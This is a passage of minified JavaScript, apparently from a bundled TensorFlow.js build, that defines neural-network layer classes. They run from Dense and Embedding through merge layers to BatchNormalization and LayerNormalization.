            this.useBias && (this.bias = this.addWeight("bias", [this.units], null, this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint))),
            this.inputSpec = [{
                minNDim: 2,
                axes: {
                    [-1]: e
                }
            }],
            this.built = !0
        }
        computeOutputShape(t) {
            const e = (t = Nt(t)).slice();
            return e[e.length - 1] = this.units,
            e
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t)
                  , o = l0(this.activation.getClassName());
                let r;
                return null != o ? r = _n(s, this.kernel.read(), o, this.bias ? this.bias.read() : null) : (r = _n(s, this.kernel.read()),
                null != this.bias && (r = Ln(r, this.bias.read())),
                null != this.activation && (r = this.activation.apply(r))),
                r
            }
            ))
        }
        getConfig() {
            const t = {
                units: this.units,
                activation: Gs(this.activation),
                useBias: this.useBias,
                kernelInitializer: Qt(this.kernelInitializer),
                biasInitializer: Qt(this.biasInitializer),
                kernelRegularizer: Vt(this.kernelRegularizer),
                biasRegularizer: Vt(this.biasRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                kernelConstraint: de(this.kernelConstraint),
                biasConstraint: de(this.biasConstraint)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Hb.className = "Dense",
    _(Hb);
    class _b extends Ct {
        constructor(t) {
            super(t = t || {}),
            this.inputSpec = [{
                minNDim: 3
            }],
            this.dataFormat = t.dataFormat
        }
        computeOutputShape(t) {
            t = Nt(t);
            for (const e of t.slice(1))
                if (null == e)
                    throw new $(`The shape of the input to "Flatten" is not fully defined (got ${t.slice(1)}). Make sure to pass a complete "input_shape" or "batch_input_shape" argument to the first layer in your model.`);
            return [t[0], Ns(t, 1)]
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                let s = mt(t);
                if ("channelsFirst" === this.dataFormat && s.rank > 1) {
                    const o = [0];
                    for (let r = 2; r < s.rank; ++r)
                        o.push(r);
                    o.push(1),
                    s = kt(s, o)
                }
                return function qR(n) {
                    if (n.rank <= 1)
                        throw new $(`batchFlatten requires a minimum rank of 2. Got rank: ${n.rank}.`);
                    const t = [n.shape[0], Ns(n.shape, 1)];
                    return W(n, t)
                }(s)
            }
            ))
        }
        getConfig() {
            const t = {};
            null != this.dataFormat && (t.dataFormat = this.dataFormat);
            const e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    _b.className = "Flatten",
    _(_b);
    class Ub extends Ct {
        constructor(t) {
            super(t),
            this.supportsMasking = !0,
            this.activation = Ls(t.activation)
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t);
                return this.activation.apply(s)
            }
            ))
        }
        getConfig() {
            const t = {
                activation: Gs(this.activation)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Ub.className = "Activation",
    _(Ub);
    class Yb extends Ct {
        constructor(t) {
            super(t),
            this.n = t.n,
            this.inputSpec = [{
                ndim: 2
            }]
        }
        computeOutputShape(t) {
            return [t[0], this.n, t[1]]
        }
        call(t, e) {
            return M((()=>function JR(n, t) {
                return M((()=>{
                    if (2 !== n.shape.length)
                        throw new $(`repeat() expects a rank-2 tensor, but received a rank-${n.shape.length} tensor.`);
                    return Eh(Ai(n, 1), [1, t, 1])
                }
                ))
            }(t = mt(t), this.n)))
        }
        getConfig() {
            const t = {
                n: this.n
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Yb.className = "RepeatVector",
    _(Yb);
    class Qb extends Ct {
        constructor(t) {
            super(t),
            this.targetShape = t.targetShape;
            for (let e = 0; e < this.targetShape.length; ++e)
                this.isUnknown(this.targetShape[e]) && (this.targetShape[e] = null)
        }
        isUnknown(t) {
            return t < 0 || null == t
        }
        fixUnknownDimension(t, e) {
            const s = "Total size of new array must be unchanged."
              , o = e.slice();
            let r = 1
              , i = null;
            for (let c = 0; c < o.length; ++c) {
                const l = o[c];
                if (this.isUnknown(l)) {
                    if (null !== i)
                        throw new $("Can only specifiy one unknown dimension.");
                    i = c
                } else
                    r *= l
            }
            const a = Ns(t);
            if (null !== i) {
                if (0 === r || a % r != 0)
                    throw new $(s);
                o[i] = a / r
            } else if (a !== r)
                throw new $(s);
            return o
        }
        computeOutputShape(t) {
            let e = !1;
            for (let s = 0; s < t.length; ++s)
                if (this.isUnknown(t[s])) {
                    e = !0;
                    break
                }
            return e ? t.slice(0, 1).concat(this.targetShape) : t.slice(0, 1).concat(this.fixUnknownDimension(t.slice(1), this.targetShape))
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t)
                  , o = s.shape
                  , r = o.slice(0, 1).concat(this.fixUnknownDimension(o.slice(1), this.targetShape));
                return W(s, r)
            }
            ))
        }
        getConfig() {
            const t = {
                targetShape: this.targetShape
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Qb.className = "Reshape",
    _(Qb);
    class Jb extends Ct {
        constructor(t) {
            if (super(t),
            null == t.dims)
                throw new Error("Required configuration field `dims` is missing during Permute constructor call.");
            if (!Array.isArray(t.dims))
                throw new Error(`Permute constructor requires \`dims\` to be an Array, but received ${t.dims} instead.`);
            const e = $n(1, t.dims.length + 1);
            if (!Rt(t.dims.slice().sort(), e))
                throw new Error("Invalid permutation `dims`: " + JSON.stringify(t.dims) + " `dims` must contain consecutive integers starting from 1.");
            this.dims = t.dims,
            this.dimsIncludingBatch = [0].concat(this.dims),
            this.inputSpec = [new ue({
                ndim: this.dims.length + 1
            })]
        }
        computeOutputShape(t) {
            const e = (t = Nt(t)).slice();
            return this.dims.forEach(((s,o)=>{
                e[o + 1] = t[s]
            }
            )),
            e
        }
        call(t, e) {
            return kt(mt(t), this.dimsIncludingBatch)
        }
        getConfig() {
            const t = {
                dims: this.dims
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Jb.className = "Permute",
    _(Jb);
    class jb extends Ct {
        constructor(t) {
            super(t ?? {}),
            this.supportsMasking = !0,
            this.maskValue = null != t ? null == t.maskValue ? 0 : t.maskValue : 0
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                maskValue: this.maskValue
            };
            return Object.assign(e, t),
            e
        }
        computeMask(t, e) {
            const s = mt(t);
            return ld(Mc(s, this.maskValue), -1)
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t)
                  , i = ld(Mc(s, this.maskValue), -1, !0);
                return E(s, st(i, s.dtype))
            }
            ))
        }
    }
    jb.className = "Masking",
    _(jb);
    class qb extends Ct {
        constructor(t) {
            if (super(t),
            this.embeddings = null,
            this.DEFAULT_EMBEDDINGS_INITIALIZER = "randomUniform",
            null == t.batchInputShape && null == t.inputShape) {
                let e = null;
                null != t.batchSize && (e = t.batchSize),
                null == t.inputLength ? this.batchInputShape = [e, null] : this.batchInputShape = [e].concat(Lt(t.inputLength))
            }
            this.inputDim = t.inputDim,
            be(this.inputDim, "inputDim"),
            this.outputDim = t.outputDim,
            be(this.outputDim, "outputDim"),
            this.embeddingsInitializer = Ht(t.embeddingsInitializer || this.DEFAULT_EMBEDDINGS_INITIALIZER),
            this.embeddingsRegularizer = _t(t.embeddingsRegularizer),
            this.activityRegularizer = _t(t.activityRegularizer),
            this.embeddingsConstraint = he(t.embeddingsConstraint),
            this.maskZero = t.maskZero,
            this.supportsMasking = t.maskZero,
            this.inputLength = t.inputLength
        }
        build(t) {
            this.embeddings = this.addWeight("embeddings", [this.inputDim, this.outputDim], this.dtype, this.embeddingsInitializer, this.embeddingsRegularizer, !0, this.embeddingsConstraint),
            this.built = !0
        }
        warnOnIncompatibleInputShape(t) {}
        computeMask(t, e) {
            return M((()=>this.maskZero ? (t = mt(t),
            Mc(t, St(t))) : null))
        }
        computeOutputShape(t) {
            if (t = Nt(t),
            null == this.inputLength)
                return [...t, this.outputDim];
            const e = Lt(this.inputLength);
            if (e.length !== t.length - 1)
                throw new $(`"inputLength" is ${this.inputLength}, but received input shape has shape ${t}`);
            {
                let s = 0;
                for (let o = 0; o < e.length; ++o) {
                    const r = e[o]
                      , i = t[o + 1];
                    if (null != r && null != i && r !== i)
                        throw new $(`"inputLength" is ${this.inputLength}, but received input shape has shape ${t}`);
                    null == r && (e[s] = i),
                    s++
                }
            }
            return [t[0], ...e, this.outputDim]
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                let s = mt(t);
                "int32" !== s.dtype && (s = Hn(s, "int32"));
                const o = b0(this.embeddings.read(), W(s, [s.size]));
                return W(o, Nt(this.computeOutputShape(s.shape)))
            }
            ))
        }
        getConfig() {
            const t = {
                inputDim: this.inputDim,
                outputDim: this.outputDim,
                embeddingsInitializer: Qt(this.embeddingsInitializer),
                embeddingsRegularizer: Vt(this.embeddingsRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                embeddingsConstraint: de(this.embeddingsConstraint),
                maskZero: this.maskZero,
                inputLength: this.inputLength
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    qb.className = "Embedding",
    _(qb);
    class xo extends Ct {
        constructor(t) {
            super(t || {}),
            this.supportsMasking = !0
        }
        mergeFunction(t) {
            throw new bt
        }
        computeElementwiseOpOutputShape(t, e) {
            if (null == t || null == e)
                return null;
            if (t.length < e.length)
                return this.computeElementwiseOpOutputShape(e, t);
            if (0 === e.length)
                return t;
            const s = t.slice(0, t.length - e.length);
            for (let o = 0; o < e.length; ++o) {
                const r = t[t.length - e.length + o]
                  , i = e[o];
                if (null == r || null == i || r < 0 || i < 0)
                    s.push(null);
                else if (1 === r)
                    s.push(i);
                else if (1 === i)
                    s.push(r);
                else {
                    if (r !== i)
                        throw new $("Operands could not be broadcast together with shapes " + JSON.stringify(t) + " " + JSON.stringify(e));
                    s.push(r)
                }
            }
            return s
        }
        build(t) {
            if (Array.isArray(t) && !Array.isArray(t[0]) && (t = [Nt(t)]),
            t.length < 2)
                throw new $(`A merge layer should be called on an Array of at least 2 inputs. Got ${t.length} input(s).`);
            let e = [];
            for (const r of t)
                null != r && null !== r[0] && e.push(r[0]);
            if (e = Ts(e),
            e.length > 1)
                throw new $(`Can not merge tensors with different batch sizes. Got tensors with shapes: ${JSON.stringify(t)}.`);
            let s = null == t[0] ? null : t[0].slice(1);
            for (let r = 1; r < t.length; ++r) {
                const i = null == t[r] ? null : t[r].slice(1);
                s = this.computeElementwiseOpOutputShape(s, i)
            }
            const o = t.map((r=>r.length));
            -1 === t.indexOf(null) && 1 === Ts(o).length ? this.reshapeRequired = !1 : this.reshapeRequired = !0
        }
        call(t, e) {
            return M((()=>{
                if (this.reshapeRequired) {
                    const s = []
                      , o = t.map((r=>r.rank));
                    if (-1 === o.indexOf(null)) {
                        const r = Rs(o);
                        for (let i of t) {
                            const a = i.rank;
                            for (let c = 0; c < r - a; ++c)
                                i = Ai(i, 1);
                            s.push(i)
                        }
                        return this.mergeFunction(s)
                    }
                    {
                        let r = !1;
                        for (const c of t) {
                            const l = c.rank;
                            if (null == l) {
                                const u = c.shape
                                  , d = u[0]
                                  , h = u.slice(1).concat([d]);
                                let p = W(c, [d].concat(Ns(u.slice(1))));
                                p = kt(p, [1, 0]),
                                p = W(p, h),
                                s.push(p),
                                r = !0
                            } else if (l > 1) {
                                const u = $n(1, l).concat([0]);
                                s.push(kt(c, u)),
                                r = !0
                            } else
                                s.push(c)
                        }
                        let i = this.mergeFunction(s);
                        const a = i.rank;
                        if (r)
                            if (null == a) {
                                const c = i.shape
                                  , u = c[c.length - 1]
                                  , d = [u].concat(c.slice(0, c.length - 1));
                                i = W(kt(W(i, [-1, u]), [1, 0]), d)
                            } else if (a > 1) {
                                const c = [a - 1].concat($n(0, a - 1));
                                i = kt(i, c)
                            }
                        return i
                    }
                }
                return this.mergeFunction(t)
            }
            ))
        }
        computeOutputShape(t) {
            let e;
            e = null == t[0] ? null : t[0].slice(1);
            for (let o = 1; o < t.length; ++o) {
                const r = null == t[o] ? null : t[o].slice(1);
                e = this.computeElementwiseOpOutputShape(e, r)
            }
            let s = [];
            for (const o of t)
                null != o && null !== o[0] && s.push(o[0]);
            return s = Ts(s),
            e = 1 === s.length ? s.concat(e) : [null].concat(e),
            e
        }
        computeMask(t, e) {
            return M((()=>{
                if (null == e)
                    return null;
                if (!Array.isArray(e))
                    throw new $("`mask` should be an Array");
                if (!Array.isArray(t))
                    throw new $("`inputs` should be an Array");
                if (e.length !== t.length)
                    throw new $(`The Array 'inputs' and 'mask' are expected to have the same length, but have different lengths (${t.length} vs ${e.length})`);
                if (e.every((o=>null == o)))
                    return null;
                let s = (e = e.map((o=>null == o ? o : Ae(o, 0))))[0];
                for (let o = 1; o < e.length - 1; ++o)
                    s = rs(s, e[o]);
                return s
            }
            ))
        }
    }
    class tx extends xo {
        constructor(t) {
            super(t)
        }
        mergeFunction(t) {
            return M((()=>{
                let e = t[0].clone();
                for (let s = 1; s < t.length; ++s)
                    e = Q(e, t[s]);
                return e
            }
            ))
        }
    }
    tx.className = "Add",
    _(tx);
    class ex extends xo {
        constructor(t) {
            super(t)
        }
        mergeFunction(t) {
            return M((()=>{
                let e = t[0].clone();
                for (let s = 1; s < t.length; ++s)
                    e = E(e, t[s]);
                return e
            }
            ))
        }
    }
    ex.className = "Multiply",
    _(ex);
    class nx extends xo {
        constructor(t) {
            super(t)
        }
        mergeFunction(t) {
            return M((()=>{
                let e = t[0].clone();
                for (let s = 1; s < t.length; ++s)
                    e = Q(e, t[s]);
                return E(1 / t.length, e)
            }
            ))
        }
    }
    nx.className = "Average",
    _(nx);
    class sx extends xo {
        constructor(t) {
            super(t)
        }
        mergeFunction(t) {
            return M((()=>{
                let e = t[0];
                for (let s = 1; s < t.length; ++s)
                    e = vs(e, t[s]);
                return e
            }
            ))
        }
    }
    sx.className = "Maximum",
    _(sx);
    class ox extends xo {
        constructor(t) {
            super(t)
        }
        mergeFunction(t) {
            return M((()=>{
                let e = t[0];
                for (let s = 1; s < t.length; ++s)
                    e = Gi(e, t[s]);
                return e
            }
            ))
        }
    }
    ox.className = "Minimum",
    _(ox);
    class rx extends xo {
        constructor(t) {
            super(t),
            this.DEFAULT_AXIS = -1,
            null == t && (t = {}),
            this.axis = null == t.axis ? this.DEFAULT_AXIS : t.axis,
            this.supportsMasking = !0,
            this.reshapeRequired = !1
        }
        build(t) {
            if (!Array.isArray(t) || !Array.isArray(t[0]) || 1 === t.length)
                throw new $("A `Concatenate` layer should be called on a list of at least 2 inputs");
            let e = !0;
            for (const o of t)
                if (null != o) {
                    e = !1;
                    break
                }
            if (e)
                return;
            const s = [];
            for (let o = 0; o < t.length; ++o) {
                const r = t[o].slice();
                r.splice(this.axis, 1);
                let i = !1;
                for (const a of s)
                    if (Rt(a, r)) {
                        i = !0;
                        break
                    }
                i || s.push(r)
            }
            if (s.length > 1)
                throw new $("A `Concatenate` layer requires inputs with matching shapes except for the concat axis. Got input shapes: " + JSON.stringify(t))
        }
        mergeFunction(t) {
            return M((()=>Lh(t, this.axis)))
        }
        computeOutputShape(t) {
            if (!Array.isArray(t) || !Array.isArray(t[0]))
                throw new $("A `Concatenate` layer should be called on a list of inputs.");
            const e = t
              , s = e[0].slice()
              , o = this.axis < 0 ? s.length + this.axis : this.axis;
            for (const r of e.slice(1)) {
                if (null == s[o] || null == r[o]) {
                    s[o] = null;
                    break
                }
                s[o] += r[o]
            }
            return s
        }
        computeMask(t, e) {
            if (null == e)
                return null;
            if (!Array.isArray(e))
                throw new $("`mask` should be an array for Concatenate");
            if (!Array.isArray(t))
                throw new $("`inputs` should be an array for Concatenate");
            if (e.length !== t.length)
                throw new $(`Mismatch in the length of mask (${e.length}) and the legnth of inputs (${t.length})`);
            return M((()=>{
                let s = !0;
                if (e.forEach((i=>{
                    null == i || (s = !1)
                }
                )),
                s)
                    return null;
                const o = [];
                for (let i = 0; i < t.length; ++i)
                    null == e[i] ? o.push(st(fn(t[i]), "bool")) : e[i].rank < t[i].rank ? o.push(Ae(e[i], -1)) : o.push(e[i]);
                const r = Xe(o, this.axis);
                return Gm(r, -1, !1)
            }
            ))
        }
        getConfig() {
            const t = {
                axis: this.axis
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    function ji(n, t) {
        for (; n < 0; )
            n += t;
        return n
    }
    rx.className = "Concatenate",
    _(rx);
    class ix extends xo {
        constructor(t) {
            super(t),
            this.axes = t.axes,
            this.normalize = null != t.normalize && t.normalize,
            this.supportsMasking = !0,
            this.reshapeRequired = !1
        }
        build(t) {
            v(Array.isArray(t) && 2 === t.length && Array.isArray(t[0]) && Array.isArray(t[1]), (()=>"A `Dot` layer should be called on a list of exactly 2 inputs."));
            const e = t[0]
              , s = t[1];
            if (e.length > 3 || s.length > 3)
                throw new bt("Dot layer does not support tensors of 4D or higher rank yet.");
            const o = this.interpretAxes(e, s);
            if (e[o[0]] !== s[o[1]])
                throw new $(`Dimension incompatibility: ${e[o[0]]} !== ${s[o[1]]}`)
        }
        mergeFunction(t) {
            if (2 !== t.length)
                throw new $(`A \`Dot\` layer must be called on exactly 2 inputs, but received ${t.length} input(s).`);
            let o, e = t[0], s = t[1];
            return o = Array.isArray(this.axes) ? this.axes.map(((r,i)=>ji(r, t[i].shape.length))) : [ji(this.axes, e.shape.length), ji(this.axes, s.shape.length)],
            this.normalize && (e = qc(e, o[0]),
            s = qc(s, o[1])),
            function yG(n, t, e) {
                if (n.shape.length > 3 || t.shape.length > 3)
                    throw new bt("batchDot is not implemented for tensors of 4D or higher rank yet");
                if (v(n.shape.length >= 2, (()=>`batchDot requires the rank of x to be >= 2, but got ${n.shape.length}`)),
                v(n.shape.length >= 2, (()=>`batchDot requires the rank of y to be >= 2, but got ${t.shape.length}`)),
                "number" == typeof e && (e = [e, e]),
                "complex64" === n.dtype || "complex64" === t.dtype)
                    throw new bt("batchDot is not implemented for complex64-type Tensors yet.");
                const s = n.shape.length
                  , o = t.shape.length;
                null == e && (e = [s - 1, o - 2]);
                const r = e;
                return M((()=>{
                    let i, a;
                    if (s > o) {
                        i = s - o;
                        const c = [];
                        for (let l = 0; l < i; ++l)
                            c.push(1);
                        t = W(t, t.shape.concat(c))
                    } else if (o > s) {
                        i = o - s;
                        const c = [];
                        for (let l = 0; l < i; ++l)
                            c.push(1);
                        n = W(n, n.shape.concat(c))
                    } else
                        i = 0;
                    if (2 === n.shape.length && 2 === t.shape.length)
                        a = r[0] === r[1] ? ut(E(n, t), r[0]) : ut(E(kt(n, [1, 0]), t), r[1]);
                    else {
                        const c = r[0] !== n.shape.length - 1
                          , l = r[1] === t.shape.length - 1;
                        a = $t(n, t, c, l)
                    }
                    if (i > 0) {
                        let c;
                        c = s > o ? s + o - 3 : s - 1;
                        const l = [];
                        for (let u = c; u < c + i; ++u)
                            l.push(u);
                        a = Di(a, l)
                    }
                    return 1 === a.shape.length && (a = Ae(a, 1)),
                    a
                }
                ))
            }(e, s, o)
        }
        interpretAxes(t, e) {
            let s;
            return s = Array.isArray(this.axes) ? this.axes : [ji(this.axes, t.length), ji(this.axes, e.length)],
            s
        }
        computeOutputShape(t) {
            v(Array.isArray(t) && 2 === t.length && Array.isArray(t[0]) && Array.isArray(t[1]), (()=>"A `Dot` layer should be called on a list of exactly 2 inputs."));
            const e = t[0].slice()
              , s = t[1].slice();
            if (e.length > 3 || s.length > 3)
                throw new bt("Dot layer does not support tensors of 4D or higher rank yet.");
            const o = this.interpretAxes(e, s);
            e.splice(o[0], 1),
            s.splice(o[1], 1),
            s.splice(0, 1);
            const r = e.concat(s);
            return 1 === r.length && r.push(1),
            r
        }
        computeMask(t, e) {
            return null
        }
        getConfig() {
            const t = {
                axes: this.axes,
                normalize: this.normalize
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    ix.className = "Dot",
    _(ix);
    class ax extends Ct {
        constructor(t) {
            super(t),
            this.supportsMasking = !0,
            this.stddev = t.stddev
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                stddev: this.stddev
            };
            return Object.assign(e, t),
            e
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t);
                return Oi((()=>Q(_c(s.shape, 0, this.stddev), s)), (()=>s), e.training || !1)
            }
            ))
        }
    }
    ax.className = "GaussianNoise",
    _(ax);
    class cx extends Ct {
        constructor(t) {
            super(t),
            this.supportsMasking = !0,
            this.rate = t.rate
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                rate: this.rate
            };
            return Object.assign(e, t),
            e
        }
        call(t, e) {
            return M((()=>{
                this.invokeCallHook(t, e);
                const s = mt(t);
                return this.rate > 0 && this.rate < 1 ? Oi((()=>{
                    const r = Math.sqrt(this.rate / (1 - this.rate));
                    return E(s, _c(s.shape, 1, r))
                }
                ), (()=>s), e.training || !1) : s
            }
            ))
        }
    }
    cx.className = "GaussianDropout",
    _(cx);
    class lx extends Ct {
        constructor(t) {
            super(t),
            this.supportsMasking = !0,
            this.rate = t.rate,
            this.noiseShape = t.noiseShape
        }
        _getNoiseShape(t) {
            return this.noiseShape || mt(t).shape
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = super.getConfig()
              , e = {
                rate: this.rate
            };
            return Object.assign(e, t),
            e
        }
        call(t, e) {
            return M((()=>{
                if (this.rate < 1 && this.rate > 0) {
                    const s = this._getNoiseShape(t);
                    return Oi((()=>{
                        const r = mt(t)
                          , c = -1.7580993408473766;
                        let l = oo(Li(s), this.rate);
                        l = Hn(l, "float32");
                        const u = ((1 - this.rate) * (1 + this.rate * c ** 2)) ** -.5
                          , d = -u * c * this.rate
                          , h = Q(E(r, l), E(Q(l, -1), c));
                        return Q(E(h, u), d)
                    }
                    ), (()=>mt(t)), e.training || !1)
                }
                return t
            }
            ))
        }
    }
    function qi(n, t, e, s, o, r=.001) {
        let i;
        if (2 === n.rank)
            i = jC(n, t, e, s, o, r);
        else if (3 === n.rank)
            i = t2(n, t, e, s, o, r);
        else {
            if (4 !== n.rank)
                throw new bt(`batchNormalization is not implemented for array of rank ${n.rank} yet`);
            i = n2(n, t, e, s, o, r)
        }
        return i
    }
    function CG(n, t, e, s, o=.001) {
        return Rt(s.slice().sort(), $n(0, n.rank - 1)) ? function IG(n, t, e, s, o=.001) {
            return M((()=>{
                const r = kd(n, s)
                  , i = r.mean
                  , a = r.variance;
                return [qi(n, i, a, e, t, o), i, a]
            }
            ))
        }(n, t, e, s, o) : function wG(n, t, e, s, o=.001) {
            return M((()=>{
                const r = kd(n, s)
                  , i = r.mean
                  , a = r.variance
                  , c = [];
                for (const f of $n(0, n.rank))
                    -1 !== s.indexOf(f) ? c.push(1) : c.push(n.shape[f]);
                const l = W(i, c)
                  , u = W(a, c)
                  , d = null == t ? null : W(t, c)
                  , h = null == e ? null : W(e, c);
                return [qi(n, l, u, h, d, o), i, a]
            }
            ))
        }(n, t, e, s, o)
    }
    lx.className = "AlphaDropout",
    _(lx);
    class ux extends Ct {
        constructor(t) {
            null == t && (t = {}),
            super(t),
            this.supportsMasking = !0,
            this.axis = null == t.axis ? -1 : t.axis,
            this.momentum = null == t.momentum ? .99 : t.momentum,
            this.epsilon = null == t.epsilon ? .001 : t.epsilon,
            this.center = null == t.center || t.center,
            this.scale = null == t.scale || t.scale,
            this.betaInitializer = Ht(t.betaInitializer || "zeros"),
            this.gammaInitializer = Ht(t.gammaInitializer || "ones"),
            this.movingMeanInitializer = Ht(t.movingMeanInitializer || "zeros"),
            this.movingVarianceInitializer = Ht(t.movingVarianceInitializer || "ones"),
            this.betaConstraint = he(t.betaConstraint),
            this.gammaConstraint = he(t.gammaConstraint),
            this.betaRegularizer = _t(t.betaRegularizer),
            this.gammaRegularizer = _t(t.gammaRegularizer)
        }
        build(t) {
            t = Nt(t);
            const e = this.axis >= 0 ? this.axis : this.axis + t.length
              , s = t[e];
            if (null == s)
                throw new $(`Axis ${e} of input tensor should have a defined dimension but the layer received an input with shape ${JSON.stringify(t)}.`);
            this.inputSpec = [new ue({
                ndim: t.length,
                axes: {
                    [e]: s
                }
            })];
            const o = [s];
            this.scale && (this.gamma = this.addWeight("gamma", o, null, this.gammaInitializer, this.gammaRegularizer, !0, this.gammaConstraint)),
            this.center && (this.beta = this.addWeight("beta", o, null, this.betaInitializer, this.betaRegularizer, !0, this.betaConstraint)),
            this.movingMean = this.addWeight("moving_mean", o, null, this.movingMeanInitializer, null, !1),
            this.movingVariance = this.addWeight("moving_variance", o, null, this.movingVarianceInitializer, null, !1),
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                const s = null != e.training && e.training
                  , o = mt(t)
                  , r = o.shape
                  , i = r.length
                  , a = $n(0, i)
                  , c = this.axis >= 0 ? this.axis : this.axis + i;
                a.splice(c, 1);
                const l = ho(1, i);
                l[c] = r[c];
                const u = a.slice();
                u.sort();
                const d = !Rt(u, $n(0, i).slice(0, i - 1));
                if (!s)
                    return (()=>{
                        if (d) {
                            const x = W(this.movingMean.read(), l)
                              , I = W(this.movingVariance.read(), l)
                              , y = this.center ? W(this.beta.read(), l) : null
                              , w = this.scale ? W(this.gamma.read(), l) : null;
                            return qi(o, x, I, y, w, this.epsilon)
                        }
                        return qi(o, this.movingMean.read(), this.movingVariance.read(), null == this.beta ? null : this.beta.read(), null == this.gamma ? null : this.gamma.read(), this.epsilon)
                    }
                    )();
                const [p,f,m] = CG(o, this.gamma.read(), this.beta.read(), a, this.epsilon)
                  , g = (x,I,y)=>{
                    M((()=>{
                        const w = 1 - y
                          , C = x.read()
                          , k = E(pt(C, I), w);
                        x.write(pt(C, k))
                    }
                    ))
                }
                ;
                return (()=>{
                    g(this.movingMean, f, this.momentum),
                    g(this.movingVariance, m, this.momentum)
                }
                )(),
                p
            }
            ))
        }
        getConfig() {
            const t = {
                axis: this.axis,
                momentum: this.momentum,
                epsilon: this.epsilon,
                center: this.center,
                scale: this.scale,
                betaInitializer: Qt(this.betaInitializer),
                gammaInitializer: Qt(this.gammaInitializer),
                movingMeanInitializer: Qt(this.movingMeanInitializer),
                movingVarianceInitializer: Qt(this.movingVarianceInitializer),
                betaRegularizer: Vt(this.betaRegularizer),
                gammaRegularizer: Vt(this.gammaRegularizer),
                betaConstraint: de(this.betaConstraint),
                gammaConstraint: de(this.gammaConstraint)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    ux.className = "BatchNormalization",
    _(ux);
    class dx extends Ct {
        constructor(t) {
            if (null == t && (t = {}),
            super(t),
            this.axis = null == t.axis ? -1 : t.axis,
            "number" == typeof this.axis) {
                if (!Number.isInteger(this.axis))
                    throw new Error(`Expected axis to be an integer, but received ${this.axis}`)
            } else {
                if (!Array.isArray(this.axis))
                    throw new Error(`Expected axis to be an integer or an array of integers, but received ${JSON.stringify(this.axis)}`);
                for (const e of this.axis)
                    if (!Number.isInteger(e))
                        throw new Error(`Expected axis to be an array of integers, but received ${JSON.stringify(this.axis)}`)
            }
            this.epsilon = null == t.epsilon ? .001 : t.epsilon,
            this.center = null == t.center || t.center,
            this.scale = null == t.scale || t.scale,
            this.betaInitializer = Ht(t.betaInitializer || "zeros"),
            this.gammaInitializer = Ht(t.gammaInitializer || "ones"),
            this.betaRegularizer = _t(t.betaRegularizer),
            this.gammaRegularizer = _t(t.gammaRegularizer),
            this.supportsMasking = !0
        }
        build(t) {
            const e = (t = Nt(t)).length;
            "number" == typeof this.axis && (this.axis = [this.axis]);
            for (let r = 0; r < this.axis.length; ++r)
                this.axis[r] < 0 && (this.axis[r] += e);
            for (const r of this.axis)
                if (r < 0 || r >= e)
                    throw new Error(`Invalid axis: ${r}`);
            if (this.axis.length !== Ts(this.axis).length)
                throw new Error(`Found duplicate axes in: ${this.axis}`);
            const s = this.axis.map((r=>t[r]))
              , o = !0;
            this.scale ? this.gamma = this.addWeight("gamma", s, "float32", this.gammaInitializer, this.gammaRegularizer, o) : this.gamma = null,
            this.center ? this.beta = this.addWeight("beta", s, "float32", this.betaInitializer, this.betaRegularizer, o) : this.beta = null,
            this.built = !0
        }
        call(t, e) {
            const s = mt(t)
              , o = s.shape
              , r = o.length;
            return M((()=>{
                let {mean: a, variance: c} = kd(s, this.axis, !0);
                const l = ho(1, r);
                for (const m of this.axis)
                    l[m] = o[m];
                const u = m=>null != m && m.shape.length !== r ? W(m, l) : m;
                let d = this.scale ? u(this.gamma.read()) : null
                  , h = this.center ? u(this.beta.read()) : null;
                const p = []
                  , f = [];
                for (let m = 0; m < r; ++m)
                    -1 !== this.axis.indexOf(m) ? (p.push(o[m]),
                    f.push(1)) : (p.push(1),
                    f.push(o[m]));
                return a = Nn(a, p),
                c = Nn(c, p),
                null != d && (d = Nn(d, f)),
                null != h && (h = Nn(h, f)),
                qi(s, a, c, h, d, this.epsilon)
            }
            ))
        }
        getConfig() {
            const t = {
                axis: this.axis,
                epsilon: this.epsilon,
                center: this.center,
                scale: this.scale,
                betaInitializer: Qt(this.betaInitializer),
                gammaInitializer: Qt(this.gammaInitializer),
                betaRegularizer: Vt(this.betaRegularizer),
                gammaRegularizer: Vt(this.gammaRegularizer)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    dx.className = "LayerNormalization",
    _(dx);
    class hx extends Ct {
        constructor(t) {
            if (null == t && (t = {}),
            super(t),
            this.dataFormat = null == t.dataFormat ? "channelsLast" : t.dataFormat,
            null == t.padding)
                this.padding = [[1, 1], [1, 1]];
            else if ("number" == typeof t.padding)
                this.padding = [[t.padding, t.padding], [t.padding, t.padding]];
            else {
                if (t.padding = t.padding,
                2 !== t.padding.length)
                    throw new $(`ZeroPadding2D expects padding to be a length-2 array, but received a length-${t.padding.length} array.`);
                let e, s;
